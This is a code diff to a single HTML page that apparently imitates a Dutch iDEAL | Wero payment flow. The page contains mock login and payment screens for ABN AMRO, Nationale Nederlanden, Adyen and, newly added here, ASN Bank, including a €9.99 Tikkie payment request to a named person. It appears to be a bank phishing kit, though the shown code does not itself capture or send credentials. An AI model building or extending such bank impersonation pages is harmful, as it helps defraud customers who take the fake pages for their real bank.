@@ -936,6 +936,161 @@
       text-decoration: underline;
     }
 
+    /* ========== ASN BANK PAGE ========== */
+    #page-asn {
+      background-color: #ffffff;
+      color: #333;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      line-height: 1.5;
+    }
+    #page-asn .asn-header {
+      background-color: #e8f5e9;
+      padding: 14px 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #d0e8d0;
+    }
+    #page-asn .asn-logo img {
+      height: 36px;
+      width: auto;
+      display: block;
+    }
+    #page-asn .asn-payment-logos img {
+      height: 32px;
+      width: auto;
+      display: block;
+    }
+    #page-asn .asn-main {
+      max-width: 640px;
+      margin: 0 auto;
+      padding: 40px 24px 60px;
+      flex: 1;
+      width: 100%;
+    }
+    #page-asn h1 {
+      color: #2e7d32;
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 20px;
+    }
+    #page-asn .asn-help-link {
+      text-align: right;
+      margin-bottom: 24px;
+    }
+    #page-asn .asn-help-link a {
+      color: #5c6bc0;
+      text-decoration: underline;
+      font-size: 14px;
+    }
+    #page-asn .asn-help-link a:hover {
+      color: #3949ab;
+    }
+    #page-asn .asn-section-title {
+      color: #2e7d32;
+      font-size: 18px;
+      font-weight: 600;
+      margin-bottom: 12px;
+    }
+    #page-asn .asn-payment-details {
+      border-top: 1px solid #e0e0e0;
+      border-bottom: 1px solid #e0e0e0;
+      padding: 16px 0;
+      margin-bottom: 32px;
+      font-size: 15px;
+      color: #333;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      cursor: pointer;
+    }
+    #page-asn .asn-payment-details .arrow {
+      color: #666;
+      font-size: 12px;
+      margin-left: 12px;
+      flex-shrink: 0;
+    }
+    #page-asn .asn-pay-methods {
+      margin-bottom: 32px;
+    }
+    #page-asn .asn-pay-button {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      background-color: #2e7d32;
+      color: white;
+      border: none;
+      border-radius: 28px;
+      padding: 14px 24px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      margin-bottom: 12px;
+      width: fit-content;
+      min-width: 180px;
+      transition: background-color 0.2s;
+      font-family: inherit;
+    }
+    #page-asn .asn-pay-button:hover {
+      background-color: #1b5e20;
+    }
+    #page-asn .asn-pay-button .icon {
+      font-size: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    #page-asn .asn-cancel-link {
+      color: #5c6bc0;
+      text-decoration: underline;
+      font-size: 15px;
+      display: inline-block;
+      margin-top: 8px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      font-family: inherit;
+      padding: 0;
+    }
+    #page-asn .asn-cancel-link:hover {
+      color: #3949ab;
+    }
+    #page-asn .asn-footer {
+      background-color: #f5f5f5;
+      padding: 20px 24px;
+      text-align: center;
+      border-top: 1px solid #e0e0e0;
+      position: relative;
+      margin-top: auto;
+    }
+    #page-asn .asn-footer a {
+      color: #5c6bc0;
+      text-decoration: underline;
+      font-size: 14px;
+    }
+    #page-asn .asn-footer a:hover {
+      color: #3949ab;
+    }
+    #page-asn .asn-bookmark {
+      position: absolute;
+      right: 24px;
+      bottom: 16px;
+      width: 36px;
+      height: 36px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      background: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #666;
+      font-size: 18px;
+      cursor: pointer;
+    }
+    #page-asn .asn-bookmark:hover {
+      background: #f0f0f0;
+    }
+
     @media (min-width: 768px) {
       .ideal-main { padding: 56px 48px 64px; }
       .ideal-split { flex-direction: row; gap: 0; align-items: center; }
@@ -1444,7 +1599,7 @@
           <img src="adyen.png" alt="Adyen">
           Adyen
         </button>
-        <button class="bank-btn" type="button">
+        <button class="bank-btn bank-asn" type="button" id="btn-asn">
           <img src="asn-bank.png" alt="ASN Bank">
           ASN Bank
         </button>
@@ -1553,6 +1708,45 @@
     </div>
   </div>
 
+  <!-- ========== ASN BANK PAGE ========== -->
+  <div id="page-asn" class="page">
+    <header class="asn-header">
+      <div class="asn-logo">
+        <img src="asn-bank-logo.png" alt="ASN Bank">
+      </div>
+      <div class="asn-payment-logos">
+        <img src="ideal.png" alt="iDEAL | Wero">
+      </div>
+    </header>
+    <main class="asn-main">
+      <h1>Betalen met iDEAL | Wero</h1>
+      <div class="asn-help-link">
+        <a href="#">❓ Hulp nodig bij betalen?</a>
+      </div>
+      <h2 class="asn-section-title">Betaalgegevens</h2>
+      <div class="asn-payment-details">
+        <span>Verzend de iDEAL | Wero-betaling van € 9,99 naar Peter van Eggele via Tikkie</span>
+        <span class="arrow">▼</span>
+      </div>
+      <h2 class="asn-section-title">Betalen met</h2>
+      <div class="asn-pay-methods">
+        <button class="asn-pay-button" type="button">
+          <span class="icon">📱</span>
+          ASN Bank app
+        </button>
+        <button class="asn-pay-button" type="button">
+          <span class="icon">🔢</span>
+          Digipas
+        </button>
+      </div>
+      <button type="button" class="asn-cancel-link" id="btn-annuleer-asn">Betalen annuleren</button>
+    </main>
+    <footer class="asn-footer">
+      <a href="#">Meer lezen over iDEAL | Wero</a>
+      <div class="asn-bookmark" title="Bladwijzer">🔖</div>
+    </footer>
+  </div>
+
   <!-- ========== NATIONALE NEDERLANDEN PAGE ========== -->
   <div id="page-nn" class="page">
     <header class="nn-header">
@@ -1619,7 +1813,6 @@
           <button class="tab" id="identTab" data-i18n-abn="tabeIdentifier">Zakelijk</button>
         </div>
         <div class="card-body">
-          <!-- QR Section -->
           <div id="qrSection">
             <h1 data-i18n-abn="titleQR">Log in met QR-code</h1>
             <div class="qr-container">
@@ -1632,7 +1825,6 @@
               </div>
             </div>
           </div>
-          <!-- e.dentifier Section -->
           <div id="identSection" style="display: none;">
             <h1 data-i18n-abn="titleEIdentifier">Log in met e.dentifier</h1>
             <div class="form-group">
@@ -1658,7 +1850,6 @@
             <button class="btn-login" data-i18n-abn="loginBtn">Inloggen</button>
             <hr class="divider">
           </div>
-          <!-- Security Key Section -->
           <div id="securitySection" style="display: none;">
             <h1 data-i18n-abn="titleSecurity">Inloggen met security key</h1>
             <div class="form-group">
@@ -1668,7 +1859,6 @@
             <button class="btn-login full" id="securityNextBtn" data-i18n-abn="nextBtn">Volgende</button>
             <hr class="divider">
           </div>
-          <!-- Alternatieven -->
           <div class="alt-login" id="altLogin">
             <button class="alt-btn" id="altSecurityBtn">
               <img src="security-key.png" alt="Security key">
@@ -1679,7 +1869,6 @@
               <span data-i18n-abn="eIdentifierLogin">Inloggen met e.dentifier</span>
             </button>
           </div>
-          <!-- Terug knop alleen op security key -->
           <div id="backToMain" style="display: none; margin-top: 10px;">
             <button class="alt-btn" id="backToMainBtn">
               <span data-i18n-abn="backToLogin">← Terug naar inloggen</span>
@@ -1752,6 +1941,7 @@
     const pageAbn = document.getElementById('page-abn');
     const pageNn = document.getElementById('page-nn');
     const pageAdyen = document.getElementById('page-adyen');
+    const pageAsn = document.getElementById('page-asn');
 
     function showPage(page) {
       if (!page) return;
@@ -1761,11 +1951,11 @@
       pageAbn.classList.remove('active');
       pageNn.classList.remove('active');
       pageAdyen.classList.remove('active');
+      pageAsn.classList.remove('active');
       page.classList.add('active');
       window.scrollTo(0, 0);
     }
 
-    // Globale functie zodat onclick="goToNn()" altijd werkt
     window.goToNn = function() {
       showPage(pageNn);
       var meta = document.querySelector('meta[name="theme-color"]');
@@ -1790,29 +1980,28 @@
       document.querySelector('meta[name="theme-color"]').setAttribute('content', '#2c2a6b');
     });
 
-    // Ideal → Bank selectie (Kies je bank)
+    // Ideal → Bank selectie
     document.getElementById('btn-kies-bank').addEventListener('click', () => {
       showPage(pageBank);
       document.querySelector('meta[name="theme-color"]').setAttribute('content', pageBank.classList.contains('dark') ? '#1a1a1a' : '#ffffff');
     });
 
-    // Bank selectie → Ideal (Terug)
+    // Bank selectie → Ideal
     document.getElementById('btn-terug-bank').addEventListener('click', () => {
       showPage(pageIdeal);
       document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff');
     });
 
-    // ABN AMRO knoppen → ABN login pagina
+    // ABN AMRO
     document.querySelectorAll('.bank-abn').forEach(btn => {
       btn.addEventListener('click', () => {
         showPage(pageAbn);
         document.querySelector('meta[name="theme-color"]').setAttribute('content', '#00857c');
-        // Reset ABN page to QR view
         if (typeof showQR === 'function') showQR();
       });
     });
 
-    // Adyen knop → Adyen pagina
+    // Adyen
     document.querySelectorAll('.bank-adyen').forEach(btn => {
       btn.addEventListener('click', () => {
         showPage(pageAdyen);
@@ -1820,13 +2009,27 @@
       });
     });
 
-    // Adyen → Bank selectie (Annuleer)
+    // Adyen → Bank
     document.getElementById('btn-annuleer-adyen').addEventListener('click', () => {
       showPage(pageBank);
       document.querySelector('meta[name="theme-color"]').setAttribute('content', pageBank.classList.contains('dark') ? '#1a1a1a' : '#ffffff');
     });
 
-    // Nationale Nederlanden knop → NN pagina (ook via addEventListener als backup)
+    // ASN Bank
+    document.querySelectorAll('.bank-asn').forEach(btn => {
+      btn.addEventListener('click', () => {
+        showPage(pageAsn);
+        document.querySelector('meta[name="theme-color"]').setAttribute('content', '#e8f5e9');
+      });
+    });
+
+    // ASN → Bank
+    document.getElementById('btn-annuleer-asn').addEventListener('click', () => {
+      showPage(pageBank);
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', pageBank.classList.contains('dark') ? '#1a1a1a' : '#ffffff');
+    });
+
+    // Nationale Nederlanden
     document.querySelectorAll('.bank-nn').forEach(function(btn) {
       btn.addEventListener('click', function(e) {
         e.preventDefault();
@@ -1834,7 +2037,6 @@
       });
     });
 
-    // NN pagina → terug naar bank selectie (backup listeners)
     var btnTerugNn = document.getElementById('btn-terug-nn');
     if (btnTerugNn) {
       btnTerugNn.addEventListener('click', function(e) {
@@ -1850,14 +2052,14 @@
       });
     }
 
-    // Andere bank knoppen (nog geen pagina)
-    document.querySelectorAll('#page-bank .bank-btn:not(.bank-abn):not(.bank-nn):not(.bank-adyen)').forEach(function(btn) {
+    // Andere banken
+    document.querySelectorAll('#page-bank .bank-btn:not(.bank-abn):not(.bank-nn):not(.bank-adyen):not(.bank-asn)').forEach(function(btn) {
       btn.addEventListener('click', function() {
         console.log('Geselecteerd:', btn.textContent.trim());
       });
     });
 
-    // ========== LANGUAGE TOGGLE (Bank pagina) ==========
+    // Language toggle
     let currentLang = 'nl';
     const translations = {
       nl: {
@@ -1908,7 +2110,7 @@
       applyLanguage(currentLang === 'nl' ? 'en' : 'nl');
     });
 
-    // ========== DARK MODE TOGGLE ==========
+    // Dark mode
     document.getElementById('btn-dark').addEventListener('click', () => {
       pageBank.classList.toggle('dark');
       const isDark = pageBank.classList.contains('dark');
@@ -1918,7 +2120,7 @@
       document.querySelector('meta[name="theme-color"]').setAttribute('content', isDark ? '#1a1a1a' : '#ffffff');
     });
 
-    // ========== ABN AMRO PAGE LOGIC ==========
+    // ABN AMRO logic
     const abnTranslations = {
       nl: {
         titleQR: "Log in met QR-code",
@@ -2041,7 +2243,6 @@
     document.getElementById('altSecurityBtn').addEventListener('click', showSecurityKey);
     document.getElementById('backToMainBtn').addEventListener('click', showQR);
 
-    // Logo + back-link → terug naar bank selectie
     document.getElementById('logoLink').addEventListener('click', (e) => {
       e.preventDefault();
       showPage(pageBank);
